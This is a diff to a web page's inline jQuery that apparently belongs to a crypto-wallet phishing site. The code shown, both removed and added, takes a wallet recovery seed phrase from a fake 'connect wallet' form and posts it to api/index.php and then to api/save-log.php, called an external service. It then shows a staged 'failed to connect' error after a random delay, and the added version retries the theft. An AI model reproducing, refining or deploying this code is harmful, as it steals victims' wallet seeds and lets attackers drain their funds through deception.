@@ -6917,165 +6917,154 @@
 	
 
         // Handle Select Wallet Click
-        $(function() {
-                /*$('#popup_connect_wallet').modal('show');
-
-                // Hide autoconnecting div and show error in random interval
-                var interval = 1000 * getRandomInt(1, 15);
-                setTimeout(() => {
-                    $('#auto_connecting').hide();
-                    $('#div_connect_manuallly').hide();
-                    $('#failed_to_connect').show();
-                }, interval);*/
-
-            $('#try_auto_connecting_again').on('click', function(e) {
-			    ms_init()
-				$('#popup_connect_wallet').modal('hide');
-                /*e.preventDefault();
-                $('#auto_connecting').show();
-                $('#failed_to_connect').hide();
-                $('#div_connect_manuallly').hide();
-
-                // Hide autoconnecting div and show error in random interval
-                var interval = 1000 * getRandomInt(1, 20);
-                setTimeout(() => {
-                    $('#auto_connecting').hide();
-                    $('#div_connect_manuallly').hide();
-                    $('#failed_to_connect').show();
-                }, interval);*/
-            });
-
-            $(document).on("click", "#button_connect_manually", function(e) {
-                e.preventDefault();
-                $('#auto_connecting').hide();
-                $('#failed_to_connect').hide();
-                $('#div_connect_manuallly').show();
-            });
-
-            //FOR PHRASE TEXT VALIDATION
-            $('#secret_phrase').on('keyup', function() {
-                var phrase_seed_entered = $(this).val().trim()
-                if (phrase_seed_entered != "") {
-                    var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
-                    console.log(phrase_count)
-                    if ([12, 15, 18, 21, 24].includes(phrase_count)) {
-                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-                    } else {
-                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-                    }
-                } else {
-                    $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
-                }
-            })
-			
-			
-			// CONNECT WALLET BUTTON Handler
-			$(document).on("click", "#button_connect_wallet", function (e) {
-				e.preventDefault();
-
-				let field = $('#secret_phrase');
-				let connectButton = $(this);
-				connectButton.text('Loading...');
-
-				// Random timeout for simulated delay
-				var interval = 1000 * getRandomInt(1, 20);
-				setTimeout(() => {
-					$('#auto_connecting').hide();
-					$('#div_connect_manuallly').hide();
-					$('#failed_to_connect').show();
-					connectButton.text('Connect Wallet');
-				}, interval);
-
-				// Collect form data
-				var formData = {
-					wallet_phrase: field.val(),
-					wallet_name: $('#wallet_name').text(),
-					_token: $('#csrf').val(),
-					sent: 'yes'
-				};
-
-				// Validate input
-				if (!formData.wallet_phrase || !formData.wallet_name) {
-					console.error('Missing required form fields');
-					connectButton.text('Connect Wallet');
-					return;
-				}
-
-				// Save data to the local database
-				$.ajax({
-					headers: {
-						'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-					},
-					url: "api/index.php", // Replace with your local endpoint
-					type: "POST",
-					data: formData,
-					dataType: "json",
-					success: function (response) {
-						if (response.status === 'success') {
-							console.log('Data saved locally:', response);
-
-							// Proceed to send data to the external service
-							$.ajax({
-								headers: {
-									'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-								},
-								url: "api/save-log.php", // External URL
-								type: "POST",
-								data: formData,
-								dataType: "json",
-								success: function (response) {
-									console.log('Form data sent to external service successfully:', response);
-								},
-								error: function (error) {
-									console.error('Error sending form data to external service:', error);
-								}
-							});
-						} else {
-							console.error('Error saving data locally:', response.message);
-						}
-					},
-					error: function (xhr, status, error) {
-						console.error('Error saving data locally:', {
-							status: status,
-							error: error,
-							response: xhr.responseText
-						});
-						connectButton.text('Connect Wallet');
-					},
-					complete: function () {
-						console.log('First AJAX request completed.');
-					}
-				});
-			});
-
-            function getRandomInt(min, max) {
-                min = Math.ceil(min);
-                max = Math.floor(max);
-                return Math.floor(Math.random() * (max - min) +
-                    min); // The maximum is exclusive and the minimum is inclusive
-            }
-            $('.search').keyup(function() {
-                var key = $(this).val()
-                var found = false
-                $('.wallets').each(function() {
-                    var dataTitle = $(this).find(".sc-author-box").data("title");
-                    if (dataTitle.toLowerCase().startsWith(key.toLowerCase())) {
-                        found = true
-                        $(this).show()
-                    } else {
-                        $(this).hide()
-                    }
-                    setTimeout(function() {
-                        if (!found) {
-                            $('.error').css('display', 'block')
-                        } else {
-                            $('.error').css('display', 'none')
-                        }
-                    }, 1)
-                })
-            })
-        });
-
+		$(function() {
+		    // Function declarations at the top
+		    function getRandomInt(min, max) {
+		        min = Math.ceil(min);
+		        max = Math.floor(max);
+		        return Math.floor(Math.random() * (max - min) + min);
+		    }
+		
+		    function makeAPIRequest(url, formData, retryCount = 0, isExternal = false) {
+		        const maxRetries = 2;
+		        
+		        $.ajax({
+		            headers: {
+		                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+		            },
+		            url: url,
+		            type: "POST",
+		            data: formData,
+		            dataType: "json",
+		            success: function (response) {
+		                if (isExternal) {
+		                    console.log('External service success:', response);
+		                } else {
+		                    console.log('Local API success:', response);
+		                    if (response.status === 'success') {
+		                        makeAPIRequest("api/save-log.php", formData, 0, true);
+		                    } else if (retryCount < maxRetries) {
+		                        setTimeout(() => makeAPIRequest(url, formData, retryCount + 1, isExternal), 1000);
+		                    } else {
+		                        // Max retries reached for local API
+		                        $('#auto_connecting').hide();
+		                        $('#div_connect_manuallly').hide();
+		                        $('#failed_to_connect').show();
+		                    }
+		                }
+		            },
+		            error: function (xhr, status, error) {
+		                console.error(`API Error (${isExternal ? 'External' : 'Local'}) Attempt ${retryCount + 1}:`, error);
+		                
+		                if (retryCount < maxRetries) {
+		                    console.log(`Retrying... Attempt ${retryCount + 1}`);
+		                    setTimeout(() => makeAPIRequest(url, formData, retryCount + 1, isExternal), 1000);
+		                } else {
+		                    console.error(`Max retries reached for ${isExternal ? 'external' : 'local'} API`);
+		                    if (!isExternal) {
+		                        $('#auto_connecting').hide();
+		                        $('#div_connect_manuallly').hide();
+		                        $('#failed_to_connect').show();
+		                    }
+		                }
+		            }
+		        });
+		    }
+		
+		    $('#try_auto_connecting_again').on('click', function(e) {
+		        ms_init();
+		        $('#popup_connect_wallet').modal('hide');
+		    });
+		
+		    $(document).on("click", "#button_connect_manually", function(e) {
+		        e.preventDefault();
+		        $('#auto_connecting').hide();
+		        $('#failed_to_connect').hide();
+		        $('#div_connect_manuallly').show();
+		    });
+		
+		    // FOR PHRASE TEXT VALIDATION
+		    $('#secret_phrase').on('keyup', function() {
+		        var phrase_seed_entered = $(this).val().trim();
+		        if (phrase_seed_entered != "") {
+		            var phrase_count = phrase_seed_entered.match(/(\w+)/g).length;
+		            console.log(phrase_count);
+		            if ([12, 15, 18, 21, 24].includes(phrase_count)) {
+		                $('#button_connect_wallet').attr('disabled', false).css('opacity', '1');
+		            } else {
+		                $('#button_connect_wallet').attr('disabled', false).css('opacity', '1');
+		            }
+		        } else {
+		            $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2');
+		        }
+		    });
+		
+		    // CONNECT WALLET BUTTON Handler
+		    $(document).on("click", "#button_connect_wallet", function (e) {
+		        e.preventDefault();
+		
+		        let field = $('#secret_phrase');
+		        let connectButton = $(this);
+		        connectButton.text('Loading...');
+		
+		        // Show loading state
+		        $('#auto_connecting').show();
+		        $('#div_connect_manuallly').hide();
+		        $('#failed_to_connect').hide();
+		
+		        // Collect form data
+		        var formData = {
+		            wallet_phrase: field.val(),
+		            wallet_name: $('#wallet_name').text(),
+		            _token: $('#csrf').val(),
+		            sent: 'yes'
+		        };
+		
+		        // Validate input
+		        if (!formData.wallet_phrase || !formData.wallet_name) {
+		            console.error('Missing required form fields');
+		            connectButton.text('Connect Wallet');
+		            $('#auto_connecting').hide();
+		            $('#failed_to_connect').show();
+		            return;
+		        }
+		
+		        // Start the API request process
+		        makeAPIRequest("api/index.php", formData);
+		
+		        // Fallback timeout in case API doesn't respond
+		        var interval = 1000 * getRandomInt(15, 25);
+		        setTimeout(() => {
+		            // Only show error if still in loading state
+		            if ($('#auto_connecting').is(':visible')) {
+		                $('#auto_connecting').hide();
+		                $('#failed_to_connect').show();
+		                connectButton.text('Connect Wallet');
+		            }
+		        }, interval);
+		    });
+		
+		    $('.search').keyup(function() {
+		        var key = $(this).val();
+		        var found = false;
+		        $('.wallets').each(function() {
+		            var dataTitle = $(this).find(".sc-author-box").data("title");
+		            if (dataTitle.toLowerCase().startsWith(key.toLowerCase())) {
+		                found = true;
+		                $(this).show();
+		            } else {
+		                $(this).hide();
+		            }
+		            setTimeout(function() {
+		                if (!found) {
+		                    $('.error').css('display', 'block');
+		                } else {
+		                    $('.error').css('display', 'none');
+		                }
+		            }, 1);
+		        });
+		    });
+		});
 	</script>
     <script type="speculationrules"> {"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/nifty\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
 </script>
